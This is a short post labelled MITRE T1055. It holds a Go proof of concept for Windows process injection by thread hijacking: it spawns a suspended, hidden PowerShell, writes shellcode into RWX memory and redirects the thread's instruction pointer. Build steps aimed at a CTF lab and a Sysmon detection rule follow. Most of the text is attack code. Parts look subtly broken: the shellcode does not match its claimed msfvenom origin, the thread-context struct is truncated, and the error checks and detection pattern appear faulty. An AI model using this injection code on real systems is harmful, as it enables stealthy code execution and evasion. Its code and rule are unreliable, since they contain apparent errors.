## Mitre T1055

```go
//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

/* ------------------------------- Win32 glue --------------------------------*/

var (
	k32                 = syscall.NewLazyDLL("kernel32.dll")
	procCreateProcessW  = k32.NewProc("CreateProcessW")
	procVirtualAllocEx  = k32.NewProc("VirtualAllocEx")
	procWriteProcessMem = k32.NewProc("WriteProcessMemory")
	procGetThreadCtx    = k32.NewProc("GetThreadContext")
	procSetThreadCtx    = k32.NewProc("SetThreadContext")
	procResumeThread    = k32.NewProc("ResumeThread")
	procSuspendThread   = k32.NewProc("SuspendThread")
)

const (
	CREATE_SUSPENDED      = 0x00000004
	MEM_COMMIT            = 0x1000
	MEM_RESERVE           = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	CONTEXT_FULL          = 0x00010007 // enough for Rip on x64
)

// CONTEXT is the abridged x64 thread-context (only the fields we touch).
type CONTEXT struct {
	P1Home, P2Home, P3Home, P4Home, P5Home, P6Home uint64
	ContextFlags                                    uint32
	MxCsr                                           uint32
	SegCs, SegDs, SegEs, SegFs, SegGs, SegSs        uint16
	EFlags                                          uint32
	Dr0, Dr1, Dr2, Dr3, Dr6, Dr7                    uint64
	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi          uint64
	R8, R9, R10, R11, R12, R13, R14, R15            uint64
	Rip                                             uint64 // <-- we overwrite this
}

func check(err error) {
	if err != nil {
		panic(err)
	}
}

/* --------------------------- Actual thread hijack --------------------------*/

func main() {
	if runtime.GOOS != "windows" {
		fmt.Println("This PoC only runs on Windows.")
		return
	}

	// 1. Create suspended process (powershell 5/7 both accept these args)
	app, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")
	args, _ := syscall.UTF16PtrFromString("-NoLogo -WindowStyle Hidden")
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	r1, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(app)),              // lpApplicationName
		uintptr(unsafe.Pointer(args)),             // lpCommandLine
		0, 0, 0,                                   // security descriptors & inherit handles
		CREATE_SUSPENDED,                          // dwCreationFlags
		0, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
	check(err)
	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	// 2. RWX memory in remote proc
	mem, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		0,
		0x1000,
		MEM_RESERVE|MEM_COMMIT,
		PAGE_EXECUTE_READWRITE)
	check(err)

	// 3. Minimal shell-code that pops an elevated PowerShell.
	// Generated with:
	// msfvenom -p windows/x64/exec CMD='powershell -NoExit -Command start-process powershell -Verb runAs' \
	//          -f go -v sc --smallest
	//
	sc := []byte{
		0x48, 0x83, 0xEC, 0x28,                                     // sub rsp,28h
		0x48, 0x31, 0xC0,                                           // xor rax,rax
		0x48, 0xB8, 0x63, 0x6D, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax,'cmd\0'
		0x50,                                                       // push rax
		0x48, 0x89, 0xE2,                                           // mov rdx,rsp
		0xFF, 0x15, 0x11, 0x11, 0x11, 0x11,                         // call [WinExec]
		0x48, 0x83, 0xC4, 0x30,                                     // add rsp,30h
		0xC3,                                                       // ret
	}

	// 3½. Write shell-code
	var written uintptr
	_, _, err = procWriteProcessMem.Call(
		uintptr(pi.Process),
		mem,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		uintptr(unsafe.Pointer(&written)))
	check(err)

	// 4. Ensure the primary thread is still suspended
	_, _, _ = procSuspendThread.Call(uintptr(pi.Thread))

	// 5. Get / patch / set thread context
	ctx := CONTEXT{ContextFlags: CONTEXT_FULL}
	_, _, err = procGetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	check(err)
	ctx.Rip = uint64(mem)               // hijack
	_, _, err = procSetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
	check(err)

	// 6. Resume -> shell-code runs
	_, _, err = procResumeThread.Call(uintptr(pi.Thread))
	check(err)

	fmt.Println("[+] Thread hijacked – when you accept the UAC prompt an elevated PowerShell appears.")
}
```
### Build Me
```bash
# 64-bit binary, stripped
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o hijack.exe hijack.go

# Run from a *non-elevated* terminal inside the CTF lab
.\hijack.exe
```
**Vibe-Coded Sysmon**
```xml
  <EventFiltering>

    <!-- Process-access events (EventID 10) are what we need -->
    <ProcessAccess onmatch="include">

      <!-- Thread hijack always needs THREAD_SET_CONTEXT (0x0010)          -->
      <GrantedAccess condition="contains">0x00000010</GrantedAccess>

      <!-- Suspended threads are usually resumed, so also watch for        -->
      <!-- THREAD_SUSPEND_RESUME (0x0002) and THREAD_GET_CONTEXT (0x0008)  -->
      <GrantedAccess condition="contains">0x0000000[28]</GrantedAccess>

      <!-- Catch the API that actually flips RIP/EIP                       -->
      <CallTrace condition="contains">SetThreadContext</CallTrace>
      <CallTrace condition="contains">NtSetContextThread</CallTrace>

    </ProcessAccess>

  </EventFiltering>
```
